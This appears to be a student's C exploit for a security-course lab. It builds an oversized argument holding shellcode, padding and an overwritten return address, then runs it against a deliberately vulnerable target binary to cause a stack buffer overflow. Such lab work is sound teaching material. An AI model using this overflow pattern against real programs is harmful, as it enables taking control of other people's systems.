#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "../targets/target1"

int main(void)
{
/*	char arg1[] = "Hi there!";
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");*/

	char arg1[345];
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };
	
	memset(arg1, 0x30, 345);
	memcpy(arg1, (char* ) shellcode, 37);
	arg1[343]=0xbe;
	arg1[342]=0xff;
	arg1[341]=0xfb;
	arg1[340]=0x10;
	if (0 > execve(TARGET, args, env))
	      fprintf(stderr, "execve failed.\n");
	return 0;
}
